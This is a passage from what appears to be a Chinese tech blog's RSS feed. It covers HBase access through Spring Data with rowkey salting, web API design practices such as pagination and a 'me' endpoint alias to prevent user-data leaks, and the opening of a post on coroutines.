configuration&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;hbase.zookeeper.quorum&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#e6db74">&amp;#34;address1:port&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#e6db74">&amp;#34;address2:port&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> HbaseTemplate&lt;span style="color:#f92672">(&lt;/span>configuration&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;strong>第三步：开始运行。&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">HbaseTemplateTest&lt;/span> &lt;span style="color:#66d9ef">extends&lt;/span> BaseTest &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#a6e22e">@Autowired&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> HbaseTemplate hbaseTemplate&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#a6e22e">@Test&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">hbaseTest&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
hbaseTemplate&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;zl_test&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#e6db74">&amp;#34;lch&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#e6db74">&amp;#34;lch&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#e6db74">&amp;#34;test&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#e6db74">&amp;#34;test2&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getBytes&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-shell" data-lang="shell">hbase&lt;span style="color:#f92672">(&lt;/span>main&lt;span style="color:#f92672">)&lt;/span>:006:0&amp;gt; scan &lt;span style="color:#e6db74">&amp;#39;zl_test&amp;#39;&lt;/span>
ROW COLUMN+CELL
lch column&lt;span style="color:#f92672">=&lt;/span>lch:test, timestamp&lt;span style="color:#f92672">=&lt;/span>1556627058655, value&lt;span style="color:#f92672">=&lt;/span>test2
&lt;span style="color:#ae81ff">1&lt;/span> row&lt;span style="color:#f92672">(&lt;/span>s&lt;span style="color:#f92672">)&lt;/span> in 0.2910 seconds
hbase&lt;span style="color:#f92672">(&lt;/span>main&lt;span style="color:#f92672">)&lt;/span>:007:0&amp;gt;
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="row-key-怎么办">Row key 怎么办？&lt;/h2>
&lt;p>如果说放弃 phoenix 带来了什么麻烦的话，那就是我们得自己考虑行键问题了。&lt;/p>
&lt;blockquote>
&lt;p>如果你的项目属于「用户消费内容」且不涉及「高并发」，那基本上可以跳过这一小节。
如果你的项目属于「用户生成内容」或涉及「高并发」那就要好好考虑行键设计。&lt;/p>
&lt;/blockquote>
&lt;h3 id="为写优化">为写优化&lt;/h3>
&lt;p>管理 hbase 数据的最小逻辑单元 region ，是按照 rowkey 字典顺序来进行分区划分的。当频繁写入某些连续字符时，可能会造成同一 region 下写入数据过多的情况。&lt;/p>
&lt;p>比如，在一个「用户生成内容」的应用程序中，常常使用时间戳作为 rowkey，这样就可能造成同一时间段内大量数据被写入到一个 region 下，产生热点效应。&lt;/p>
&lt;p>为了使我们的写入平均分配到各 region 中，必须对 rowkey 做出一些处理。一个简便的方式便是利用&lt;strong>散列算法与集群数量做加盐处理。&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">Long now &lt;span style="color:#f92672">=&lt;/span> LocalDateTime&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">now&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#a6e22e">toInstant&lt;/span>&lt;span style="color:#f92672">(&lt;/span>ZoneOffset&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">UTC&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#a6e22e">toEpochMilli&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
String saltedInput &lt;span style="color:#f92672">=&lt;/span> String&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">format&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;%s|%s&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> now&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">hashCode&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">%&lt;/span> 6&lt;span style="color:#f92672">,&lt;/span> now&lt;span style="color:#f92672">);&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>saltedInput&lt;span style="color:#f92672">);&lt;/span>
sout:
4&lt;span style="color:#f92672">|&lt;/span>1556729837940
&lt;/code>&lt;/pre>&lt;/div>&lt;p>大功告成，现在 0 ～ 9 会平均分配到不同的 region 分区上，避免了热点效应。&lt;/p>
&lt;h3 id="为读扫描优化">为读（扫描）优化&lt;/h3>
&lt;p>同样以「在一个用户生成内容的应用程序中使用时间戳作为 rowkey 的情况」作为示例。&lt;/p>
&lt;p>为读（扫描）优化意味着你最好把所有的数据尽量放到同一个列族与同一个 region 分区中。
另外，使用倒序时间戳作为 rowkey 也是一个不错的选择。hfile 的有序特性使最新的时间戳数据总是保持在文件起始位，这样在读取操作时就避免了过多的硬盘读，也不需要做额外的排序工作。&lt;/p>
&lt;h3 id="到底应该为读还是为写">到底应该为读还是为写？&lt;/h3>
&lt;p>回顾上面小节的内容，为写优化意味着在读操作上需要付出相应的代价。现在扫描操作不得不在所有的 region 分区上进行遍历了，这大大增加了 IO 开销。&lt;/p>
&lt;p>而为读优化，和为写优化的做法背道而驰，容易造成写入时的热点效应。&lt;/p>
&lt;p>是的，读与写无法同时兼顾。为了构建出完整的应用程序你需要做出取舍。&lt;/p>
&lt;h2 id="结语">结语&lt;/h2>
&lt;p>虽然最终选择了使用 spring data 来操作 hbase，但这并不代表其他的方式都不好。每种工具都有自己的特点和不足，结合自己的实际情况做出选择才是最明智的做法。&lt;/p></description></item><item><title>web api 的请求与响应</title><link>https://www.chucklin.net/post/webapi2/</link><pubDate>Sat, 18 Jan 2020 09:23:00 +0800</pubDate><guid>https://www.chucklin.net/post/webapi2/</guid><description>&lt;p>恭喜。阅读到本章节的内容代表你领会并且理解了第一章的内容。现在你设计的 Web Api 已经超过了 50%的程序员了。从本章节开始我们来完善 api 设计的各方面细节，向 api 设计专家靠拢。&lt;/p>
&lt;h2 id="查询的设计">查询的设计&lt;/h2>
&lt;p>依据上一章节的内容，REST LEVEL2 的查询只需要使用 GET 方法与 URI 定位到相应资源就可以了。但实际业务中查询往往涉及更复杂的细节处理，查询参数就是最富有代表性的细节处理之一。&lt;/p>
&lt;h3 id="查询参数">查询参数&lt;/h3>
&lt;p>我们所说的查询参数是指：在 http method 为 GET 的查询 api 中，使用 urlencode 的传参方式，既在 URI 的末尾？后面添加的相应参数。&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>示例&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>api.linkedin.com/v1/people-search?first-name=Clair&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>如上所述，first-name 既为你的查询参数对应的 key 值。通常我们会根据不同的业务信息，使用对应的 key 名称。&lt;/p>
&lt;p>不过，偶尔你也会看到下面这样的查询参数。&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>示例&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>api.instagram.com/v1/users/search?q=jack&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>api.instagram.com/v1/users/search?name=jack&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>q 是 query 的缩写。为什么这里不使用可以反映实际业务信息的 key 名称？因为 q 往往表示范围搜索。上述第一个示例表示搜索包含 jack 词组的所有用户列表。而第二个示例表示名称为 jack 的所有用户列表。
所以，后端开发人员需要在 api 的设计中，根据实际情况慎重选择是否要使用 q 或者 query 这个单词作为你的查询参数的 key。
最后看看微软是如何设计搜索引擎的查询参数的。&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>示例&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>&lt;a href="https://www.bing.com/search?q=URI+test">https://www.bing.com/search?q=URI+test&lt;/a>&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;blockquote>
&lt;p>当 uri 中存在无法直接使用的字符时，会用一种百分号编码的方式对字符进行处理。例如%E3%81 等。你可能会认为使用 ASCII 字符集就可以高枕无忧了。但是应该各位注意，%、&amp;amp;、+等字符也需要百分号编码。而空格符号在百分号编码中会被编码为+号。&lt;/p>
&lt;/blockquote>
&lt;h3 id="分页查询">分页查询&lt;/h3>
&lt;h4 id="相对位置分页">相对位置分页&lt;/h4>
&lt;p>分页查询的要点在于如何设计分页参数。通常来说基于和数据库类似的 limit 与 offset 的组合相对更通俗易懂。&lt;/p>
&lt;pre tabindex="0">&lt;code>limit=50&amp;amp;offset=100
&lt;/code>&lt;/pre>&lt;p>但是由于查询往往会涉及到数据库的读操作，而在数据量很大的情况下基于 limit 与 offset 的相对位置的查询组合的缺陷会逐渐暴露出来。试想下面这样的查询参数。&lt;/p>
&lt;pre tabindex="0">&lt;code>limit=50000&amp;amp;offset=10000
&lt;/code>&lt;/pre>&lt;p>这十分可怕，类似于这样的查询请求对服务器和客户端都是灾难。&lt;/p>
&lt;h4 id="绝对位置分页">绝对位置分页&lt;/h4>
&lt;p>有一种绝对位置分页的方法可作为你的备选项。它没有使用“从头开始第几条”的描述方法，而是指定了某个 ID 之前，或者日期之前的条件。这样我们查询数据库时可以使用范围匹配来查询出数据返回到客户端，避免了使用数据库的分页功能从而造成性能隐患。&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>示例&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>sample.api.com/v1/user/register-before/2017-08-15T00:00:00&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>客户端请求查询 17 年 8 月 15 日之前注册的所有用户的信息列表。服务器端对于这样的请求使用&lt;/p>
&lt;pre tabindex="0">&lt;code>select * from user where time &amp;lt; 2017-08-15T00:00:00
&lt;/code>&lt;/pre>&lt;p>即可轻松解决问题。从而避免了从 1 开始计数的扫表操作。&lt;/p>
&lt;h3 id="查询参数与-uri-如何取舍">查询参数与 URI 如何取舍&lt;/h3>
&lt;p>下面这两个示例，你觉得哪个更好？嘘，先别说话。用心去感受。&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>示例&lt;/th>
&lt;th>&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>A&lt;/td>
&lt;td>sample.api.com/v1/user/1198723&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>B&lt;/td>
&lt;td>sample.api.com/v1/user?userid=1198723&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>无论你选择了 A 或者 B，希望你都是出自于理性思考而非感觉。 A 与 B 的区别在于 A 的设计将查询参数放到了 URI，而 B 的设计保持了查询参数的原本位置。可能在目前市面上 B 的设计更为常见一点。&lt;/p>
&lt;p>类似于这样的查询参数与 URI 取舍的问题，我们最好采用下面这 2 个决策依据帮助我们进行判断。&lt;/p>
&lt;ul>
&lt;li>参数是否表示唯一的资源所需的信息&lt;/li>
&lt;li>是否可以省略&lt;/li>
&lt;/ul>
&lt;p>结合参数若能够定位到互联网上唯一的资源，则应该将查询参数放到 URI 中。这是基于 URI 的根本含义：统一资源定位符含义来进行设计的。而若查询参数无法配合 URI 定位到唯一的资源甚至与资源无关的话，则应该放到参数位置。
所以，A 的设计在学术理论上更优于 B。这代表着从今天开始，你对于查询接口的设计水平已经超越了贵公司大部分工程师。&lt;/p>
&lt;h2 id="响应的设计">响应的设计&lt;/h2>
&lt;p>相对查询来说响应的设计更考究工程师的细节功底。&lt;/p>
&lt;h3 id="性别的设计">性别的设计&lt;/h3>
&lt;p>性别有两大主流设计。&lt;/p>
&lt;ol>
&lt;li>使用数值来标识对应的性别。&lt;/li>
&lt;li>使用 male、female。&lt;/li>
&lt;/ol>
&lt;p>实际上无论使用哪种都是可以接受的。但是！你需要知道 14 年 facebook 上线的新系统里性别的可选项目增加到了 50 种以上。假如你负责设计的接口是供一个 SNS 系统而使用的话，则需要考虑保证社交系统中关于性别的多元化的可能性。所以使用 2，比 1 的可扩展性更强一些。&lt;/p>
&lt;h3 id="日期的格式">日期的格式&lt;/h3>
&lt;p>在 Http 协议的定义中，http header 中通常会使用 UTC 来标识 Http 的时间。因此在设计 api 时，也推荐使用时区“+00:00”。相对于 epochtime 我更喜欢 RFC 3339 的日期格式，他更易读并且能够体现出时区的概念。而若要使用 UTC 时间的话，则在后面加上 Z 标识即可。&lt;/p>
&lt;pre tabindex="0">&lt;code>2017-11-11T13:00:12+00:00
2017-11-11T13:00:12Z
2017-11-11T10:00:00-00:00
&lt;/code>&lt;/pre>&lt;p>-00:00 时区标识时区不明。虽然这种表示很少见，但是正因为少见所以需要重点掌握。&lt;/p>
&lt;h3 id="整数">整数&lt;/h3>
&lt;p>计算机中 int 占用 4 个字节。如果使用 unsigned 无符号类型的话，则能表示 0 到 4294967295.如果你设计的是一个 SNS 网站，一定要避免用 int 作为返回值，来标识用户的 id 或者其他信息，因为这点空间是完全不够的。将信息量较大的数据统统使用 string 来表示吧。&lt;/p>
&lt;h2 id="别名的设计">别名的设计&lt;/h2>
&lt;p>试想，某日你接到了一个用户模块的设计，其中包括了一个功能：即登录用户可以通过 api 查询用户的个人详细信息。大部分工程师针对此需求很容易设计出以下的代码。&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>示例&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>&lt;a href="https://sample.api.com/v1/user/info/1987203">https://sample.api.com/v1/user/info/1987203&lt;/a>&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>&lt;strong>response&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-json" data-lang="json">{
&lt;span style="color:#f92672">&amp;#34;userId&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>,
&lt;span style="color:#f92672">&amp;#34;userName&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>,
&lt;span style="color:#f92672">&amp;#34;userPassword&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>回想一下你是不是设计过这样的端点？&lt;/p>
&lt;p>很可惜，你的代码实际上引发了一个巨大的安全隐患。用户可以传入任何用户的 id 信息查询到对应用户的隐私数据，造成用户信息泄露。&lt;/p>
&lt;p>针对这样的需求，在设计此类 api 时应该使用别名来代替用户 id 的传入，防止混淆使用一个接口完成查询其他用户与自身详情两个功能导致信息泄露的问题。&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>示例&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>&lt;a href="https://sample.api.com/v1/user/info/me">https://sample.api.com/v1/user/info/me&lt;/a>&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>像上述示例中的 api，客户端访问以 me 或者 self 单词结尾的端点，服务器获取到请求后，根据用户 access zoken 查询用户的详细信息返回给客户端使用。&lt;/p>
&lt;p>而针对其他用户的信息获取我们采用&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>示例&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>&lt;a href="https://sample.api.com/v1/user/info/1987203">https://sample.api.com/v1/user/info/1987203&lt;/a>&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>不同的端点去解决需求。通过使用这样的设计方式，让这两个接口的开发被拆分开来，从而最大限度的降低了混淆使用获取其他用户信息 api 与获取自身用户信息 api 接口的可能性。更容易防止误将其他用户的个人信息对外公开的 bug 发生。&lt;/p>
&lt;h2 id="最后">最后&lt;/h2>
&lt;p>优秀的 Web Api 设计需要大量细节上的考量，是体现一个工程师水平最直观的方式之一。不用怀疑，在学习了本系列文章过后，你就基本掌握了 web api 设计的大部分窍门儿了。
如果你能参照本系列文章的知识点坚持认真对待每一个 api 的设计，那成长成为真正的专家级设计师则指日可待。&lt;/p>
&lt;hr>
&lt;p>Copyright 2017/08/15 by Chuck Lin&lt;/p>
&lt;p>参考书籍
《Web Api 的设计与开发》&lt;/p></description></item><item><title>什么是好的 Web Api 的设计</title><link>https://www.chucklin.net/post/webapi/</link><pubDate>Fri, 17 Jan 2020 09:23:00 +0800</pubDate><guid>https://www.chucklin.net/post/webapi/</guid><description>&lt;h2 id="web-api-的重要性">Web Api 的重要性&lt;/h2>
&lt;p>web api 就像一张名片一样，专业的名片可以迅速帮助你与客户之间建立信任感，也可能让你的产品在被使用前，就给客户留下业余，糟糕的负面印象。而一旦客户对你的产品产生负面情绪，这种情绪就会蔓延到产品生态圈甚至于相关公司上。&lt;/p>
&lt;p>所以，优雅的 api 设计是成功的产品不可或缺的一部分。&lt;/p>
&lt;p>回归主题，对后端工程师来讲，web api 的设计是每天都会接触的工作。在枯燥单调的重复性劳作中，你是否曾经认真思考过好的 web api 设计应该是什么样子的？&lt;/p>
&lt;p>别担心。本篇文章围绕 web api 的设计，作者与大家分享一些 api 设计的套路与规范，让你和你的团队也能设计出优雅、健壮、扩展性强的应用程序接口。&lt;/p>
&lt;h2 id="什么是优雅的-web-api">什么是优雅的 Web Api&lt;/h2>
&lt;p>先让我们回顾曾经提到过的关于设计模式的内容：设计模式的精髓在于设计原则，而非模式的生搬硬套。与此类似，优雅的 Web Api 有两个重要原则、如下所示：&lt;/p>
&lt;ul>
&lt;li>设计规范明确的内容必须遵守相关规范&lt;/li>
&lt;li>没有设计规范的内容必须遵守相关事实标准&lt;/li>
&lt;/ul>
&lt;p>给自己一些时间，认真阅读并体会上面两个重要原则。&lt;/p>
&lt;p>读完上面两个重要原则后，你现在应该依然对如何设计 web api 毫无头绪。别着急，好的创作总是从模仿开始的。&lt;/p>
&lt;p>在我们开始长篇大论之前，先通过国际大厂的 web api 示例来观赏一下国际范儿的 web api 长啥样吧。&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>厂名&lt;/th>
&lt;th>uri&lt;/th>
&lt;th>备注&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>Twitter&lt;/td>
&lt;td>api.twitter.com/1.1&lt;/td>
&lt;td>&amp;ldquo;治国理政平台&amp;rdquo;&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Google Calendar&lt;/td>
&lt;td>&lt;a href="http://www.googleapis.com/calendar/v3">www.googleapis.com/calendar/v3&lt;/a>&lt;/td>
&lt;td>&amp;ldquo;大厂&amp;rdquo;&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>instagram&lt;/td>
&lt;td>api.instagram.com/v1/usrs/search?q=jack&lt;/td>
&lt;td>&amp;ldquo;宠物自拍网站&amp;rdquo;&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>linkedin&lt;/td>
&lt;td>api.linkedin.com/v1/people-search&lt;/td>
&lt;td>&amp;ldquo;招工&amp;rdquo;&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Tumblr&lt;/td>
&lt;td>api.tumblr.com/v2&lt;/td>
&lt;td>&amp;ldquo;真的不是成人网站&amp;rdquo;&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>foursquare&lt;/td>
&lt;td>api.foursquare.com/v2/venues/search?q=apple&amp;amp;categoryId=asad123456&lt;/td>
&lt;td>&amp;ldquo;基于地理位置射交&amp;rdquo;&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>为节约篇幅举例就到此了。如果你觉得示例较少，可自行搜索其他大厂的 Api 示例。&lt;/p>
&lt;p>分析这些大厂 Api 端点的设计可以揣摩总结出各种套路规范，供我们模仿学习，这是我们的第一步。&lt;/p>
&lt;h2 id="如何设计出国际范儿的-api-端点">如何设计出国际范儿的 Api 端点？&lt;/h2>
&lt;h3 id="背口诀">背口诀&lt;/h3>
&lt;p>观察和分析上一小节中的国际大厂的设计往往都具备以下几个特点：&lt;/p>
&lt;ul>
&lt;li>
&lt;p>短小便于输入的 URI。&lt;/p>
&lt;blockquote>
&lt;p>没人喜欢复杂的单词。&lt;/p>
&lt;/blockquote>
&lt;/li>
&lt;li>
&lt;p>人可以读懂的 URI。&lt;/p>
&lt;blockquote>
&lt;p>名片是拿给人读的。不要把机器码和 16 进制写到 URI 里。&lt;/p>
&lt;/blockquote>
&lt;/li>
&lt;li>
&lt;p>没有大小写混用的 URI。&lt;/p>
&lt;blockquote>
&lt;p>实际上一般的事实规范是建议全部小写。&lt;/p>
&lt;/blockquote>
&lt;/li>
&lt;li>
&lt;p>修改方便的 URI。&lt;/p>
&lt;blockquote>
&lt;p>api.sample.com/user/:id 傻子都看的出来通过变量 id 可以访问不同的用户信息。&lt;/p>
&lt;/blockquote>
&lt;/li>
&lt;li>
&lt;p>不会暴露服务端架构的 URI。&lt;/p>
&lt;blockquote>
&lt;p>api.sample.com/servlet/login.do 这样的代码傻子都知道后端是用面向环境编程的语言写的。&lt;/p>
&lt;/blockquote>
&lt;/li>
&lt;li>
&lt;p>规则统一的 URI。&lt;/p>
&lt;blockquote>
&lt;p>api.com.cn/Api/user-InfoById/info.json&lt;/p>
&lt;/blockquote>
&lt;/li>
&lt;li>
&lt;p>当端点里出现两个以上的单词时，使用脊柱法（连词符号）。&lt;/p>
&lt;blockquote>
&lt;p>api.linkedin.com/v1/people-search&lt;/p>
&lt;/blockquote>
&lt;/li>
&lt;/ul>
&lt;p>本篇文章大部分读者都是工程师，而且很聪明。所以我认为没有必要对所有的特点进行说明。只要把以上特点都背下来然后记在脑子里，设计的第一步你就合格了。&lt;/p>
&lt;h3 id="合理利用-rest-api">合理利用 REST API&lt;/h3>
&lt;p>好的 WEB API 离不开的概念就是 REST API。那么优雅的 API 是不是一定要采用 REST API 来设计呢？
要理清这个问题首先要搞明白 REST 的准确含义到底是什么。&lt;/p>
&lt;p>REST API 的概念首先出现在 Roy Fielding 的论文中。
狭义上的 REST API 实际上就是指符合 Fielding 的 REST 架构风格的 Web 服务系统。REST API 的设计风格严谨，考虑周全，结构优美。但过于苛刻的标准一直是狭义 REST API 推广壮大的绊脚石。&lt;/p>
&lt;p>广义上的 REST API 指符合 RPC 风格的 JSON + Http 的接口的系统。这样的 REST API 定义却又过于粗犷和随意了。&lt;/p>
&lt;p>于是，针对 WEB API 的发展以及广义 REST 与 狭义 REST 的特点， Martin Fowler 提出在达到完美的 REST API 之前有以下几种 API 的设计级别。&lt;/p>
&lt;ul>
&lt;li>REST LEVEL0: 使用 HTTP&lt;/li>
&lt;li>REST LEVEL1: 引入资源的概念&lt;/li>
&lt;li>REST LEVEL2: 引入 HTTP 动词&lt;/li>
&lt;li>REST LEVEL3: 引入 HATEOAS 概念&lt;/li>
&lt;/ul>
&lt;p>按照 HTTP 协议中，URI 代表资源，而 HTTP method 代表对资源的操作。
我以此理论作为基础，再参照上述 REST LEVEL，我设计了一个符合 REST LEVEL2 标准的示例 URI ，如下所示&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>目的&lt;/th>
&lt;th>端点&lt;/th>
&lt;th>方法&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>获取用户信息列表&lt;/td>
&lt;td>api.example.com/v1/users&lt;/td>
&lt;td>GET&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>新用户注册&lt;/td>
&lt;td>api.example.com/v1/users&lt;/td>
&lt;td>POST&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>获取特定用户信息&lt;/td>
&lt;td>api.example.com/v1/users/:id&lt;/td>
&lt;td>GET&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>更新用户信息&lt;/td>
&lt;td>api.example.com/v1/users/:id/&lt;/td>
&lt;td>PUT/PATCH&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>删除用户信息&lt;/td>
&lt;td>api.example.com/v1/users/:id&lt;/td>
&lt;td>DELETE&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>从今以后，你的 WEB API 只要参照以上示例设计，那就是符合基本标准，也很难被吐槽的 WEB API。&lt;/p>
&lt;p>最后补充一点，虽然 REST Level3 描绘了一副美妙的蓝图。但截止本篇文章发表之前互联网上的大部分项目都只是朝向 Level2 的标准在努力，距离 LEVEL3 还有十分遥远的距离。故本篇文章就不在此展开对 LEVEL3 的讨论了。如果你有兴趣请自行参考相关资料了解。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>本篇文章是本系列的第一个篇章。着重围绕各大厂的 API 示例与设计行业的通用理念，归纳总结了若干设计国际范儿 api 的套路与规则。熟读这些套路，遵守这些规则是你领会 web api 设计的一小步。后期的文章中我们将逐步介绍各种设计细节，完善你的网络应用程序接口。&lt;/p>
&lt;hr>
&lt;p>Copyright 2017/08/15 by Chuck Lin&lt;/p>
&lt;p>参考书籍
《Web Api 的设计与开发》&lt;/p></description></item><item><title>协程实战</title><link>https://www.chucklin.net/post/coroutine/</link><pubDate>Thu, 16 Jan 2020 09:23:00 +0800</pubDate><guid>https://www.chucklin.net/post/coroutine/</guid><description>&lt;h2 id="并发与并行">并发与并行&lt;/h2>
&lt;p>计算机自诞生以来，有两方面的性能在持续改进。一是尝试让计算机运行的更快，我们设计了并发使系统具备处理多个任务的能力。二是人类在尝试让计算机做的更多，我们设计了并行使系统可以同时运行多个任务。&lt;/p>
&lt;blockquote>
&lt;p>我们利用术语并发（concurrency）来指一个同时具有多个活动的系统。用并行（parallelism）指代同时运行几个任务使一个系统运行的更快。&lt;/p>
&lt;/blockquote>
&lt;p>Erlang 之父 Joe Armstrong 用一张 5 岁小孩都能看懂的图解释了并发与并行的区别&lt;/p>
&lt;p>&lt;img src="http://static.zybuluo.com/mikumikulch/ewr4jip3mpu1z0pyokxuu46p/v2-674f0d37fca4fac1bd2df28a2b78e633_hd.jpg" alt="v2-674f0d37fca4fac1bd2df28a2b78e633_hd.jpg-19.2kB">&lt;/p>
&lt;p>并发就是两个队列的顾客一起去一个窗口买咖啡。并行是两个队列的人分别去两个窗口买咖啡。&lt;/p>
&lt;p>并发和串行处理有什么区别？&lt;/p>
&lt;p>并发中的队列里的人一旦买完咖啡后就马上去别的地方等着咖啡煮好，轮到队列中的下一位顾客。而串行处理则是上一位顾客买好咖啡直到咖啡煮好后，才轮到队列中的下一位顾客购买咖啡。&lt;/p>
&lt;p>为使并发与并行在计算机中得到广泛的应用，操作系统屏蔽了底层硬件细节，提供了进程与线程两种抽象供开发人员使用，这就是线程的由来。&lt;/p>
&lt;p>线程的概念想必你已经很熟悉了。同一个进程由多个称为线程的执行单元组成，线程们共享一个进程上下文。cpu 在多个线程之间由操作系统调度器进行切换，并保存当前线程状态到寄存器或主存。&lt;/p>
&lt;p>除了线程以外，还有什么可以使计算机具备多任务处理能力的技术吗？答案是有。使用协程也能实现并发程序。&lt;/p>
&lt;h2 id="为什么使用协程">为什么使用协程&lt;/h2>
&lt;p>协程是一种已经存在了几十年的轻量级线程，这种抽象技术具备线程的大部分特点。利用协程也能设计出支持并发的程序。与线程的不同之处在于，协程不是抢占式的，你在代码中必须标注出什么时候可以安全的暂停执行当前任务，让位给其他任务。&lt;/p>
&lt;p>学术定义总是枯燥难懂，还是代码示例更加的平易近人。来看下面的例子：&lt;/p>
